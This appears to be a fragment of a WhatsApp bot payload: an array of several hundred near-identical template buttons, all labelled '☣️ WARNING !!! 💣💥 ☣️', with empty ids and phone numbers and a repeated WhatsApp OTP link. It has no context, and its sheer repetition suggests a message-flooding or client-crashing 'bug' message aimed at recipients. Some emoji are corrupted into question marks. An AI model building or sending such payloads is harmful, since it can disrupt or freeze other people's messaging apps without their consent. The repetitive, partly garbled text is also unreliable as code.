{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣?? ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣?? ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣?? ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣?? ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
